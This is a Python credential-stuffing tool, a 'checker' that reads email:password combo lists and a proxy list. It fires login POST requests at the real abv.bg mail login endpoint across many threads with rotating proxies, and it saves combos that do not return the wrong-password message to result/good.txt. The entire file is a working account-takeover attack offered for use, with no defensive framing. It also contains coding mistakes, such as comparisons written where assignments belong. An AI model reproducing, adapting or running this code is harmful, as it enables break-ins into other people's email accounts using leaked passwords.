import requests, threading, os, sys, time, random
from colorama import Fore, init

threads = 0
proxy_type = ""

good, bad, checked, cpm1, cpm2, banned, error = 0, 0, 0, 0, 0, 0, 0

global emails, passwords
emails, passwords = [], []
proxyline = []

logo = """   
    ____ _               _             
   / ___| |__   ___  ___| | _____ _ __ 
  | |   | '_ \ / _ \/ __| |/ / _ \ '__|
  | |___| | | |  __/ (__|   <  __/ |   
   \____|_| |_|\___|\___|_|\_\___|_|   
                                      """

def load_combos():
    global emails, passwords
    emails.clear()
    passwords.clear()
    os.system('cls')
    input("  Press any key to load combos")
    try:
        with open("combos.txt", "r+", encoding="utf-8") as e:
            ex = e.readlines()
            for line in ex:
                try:
                    email, password = line.split(":")[0].replace('\n', ''), line.split(":")[1].replace('\n', '')
                    emails.append(email)
                    passwords.append(password)
                except Exception:
                    pass
        print("  Loaded {} combo line(s)".format(len(emails)))
    except Exception:
        print("  Please create a file named: 'combos.txt' and add your combos into it..")
        time.sleep(2)
        load_combos()

def load_proxies():
    global proxyline
    proxyline.clear()
    os.system('cls')
    input("  Press any key to load proxies")
    try:
        with open("proxies.txt", "r+", encoding="utf-8") as e:
            ex = e.readlines()
            for line in ex:
                try:
                    line_after = line.split()[0].replace('\n', '')
                    proxyline.append(line_after)
                except Exception:
                    pass
        print("  Loaded {} proxy line(s)".format(len(proxyline)))
    except Exception:
        print("  Please create a file named: 'proxies.txt' and add your combos into it..")
        time.sleep(2)
        load_combos()

def check(email, password, proxyline):
    global bad, good, checked, cpm1, cpm2, banned, emails, error
    try:
        
        url = "https://passport.abv.bg/app/profiles/login"
        headers = {
            "Host":"passport.abv.bg",
            "Connection":"keep-alive",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Origin":"https://www.abv.bg",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site":"same-site",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "Referer":"https://www.abv.bg/",
            "Accept-Language":"en-US,en;q=0.9",
            "Cookie":"_h=4edbc55e00e41332daed5e094e2280a0",
            "Accept-Encoding":"gzip, deflate",
            "Content-Length":"113"
        }
        try:
            before, after = email.split("@")[0], email.split("@")[1]
            content = "host=mail01.abv.bg&service=mail&username={}%40{}&password={}&loginBut=%D0%92%D1%85%D0%BE%D0%B4".format(before, after, password)
        except:
            content = "host=mail01.abv.bg&service=mail&username={}&password={}&loginBut=%D0%92%D1%85%D0%BE%D0%B4".format(email, password)
        sess = requests.Session()
        proxy = random.choice(proxyline)
        proxy1 = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        sess.proxies = proxy1
        r = sess.post(url, headers=headers, data=content)
        if "Грешен потребител / парола." in r.text:
            bad+=1
            checked+=1
            cpm1+=1
            open("result/bad.txt", "a+").write("{}:{}\n".format(email, password))
        else:
            good+=1
            checked+=1
            cpm1+1
            open("result/good.txt", "a+").write("{}:{}\n".format(email, password))
    except:
        error+=1


def screen():
    global bad, good, checked, cpm1, cpm2, banned, emails, error
    cpm2 = cpm1
    cpm1 = 0
    os.system('cls')
    print(logo)
    print()
    print("  Checking..")
    print()
    print("  Checked - [{}/{}]".format(checked, len(emails)))
    print("  Good - [{}]".format(good))
    print("  Bad - [{}]".format(bad))
    print("  IP Banned - [{}]".format(banned))
    print("  CPM - [{}]".format(cpm2*60))
    print("  Error: [{}]".format(error))
    time.sleep(1)
    threading.Thread(target=screen, args=()).start()

def main():
    os.system('cls')
    print("\n{} \n".format(logo))
    print("  Please choose one option")
    print("\n  [1] Checker\n  [2] Leave")
    try:
        question = int(input(" "))
    except KeyError:
        print("  Please choose valid input..")
        time.sleep(2)
        main()
    if question == 1:
        print()
    else:
        sys.exit()

main()


os.system('cls')
print("  How many Threads do you want to use?")
try:
    threads1 = input("  ")
except KeyError:
    print("  Please enter valid input..")
    time.sleep(1)
threads = threads1
print("  Loaded {} threads".format(threads))
time.sleep(1)
load_combos()
os.system('cls')
print("  What proxy type you want to use?")
print("\n  [1] Http/s\n  [2] Socks4\n  [3] Socks5")
try:
    proxy_t = int(input("  "))
except KeyError:
    print(" Invalid input..")
    time.sleep(2)
if proxy_t == 1:
    proxy_type == "https"
elif proxy_t == 2:
    proxy_type == "socks4"
elif proxy_t == 3:
    proxy_type == "socks5"
else:
    print("  Invalid input..")
    time.sleep(2)
load_proxies()
num = 0
screen()
while 1:
    if "extreme" == "extreme":
        if threading.active_count() < int(threads):
            if num < len(emails):
                threading.Thread(target=check, args=(emails[num], passwords[num], proxyline,)).start()
                num+=1
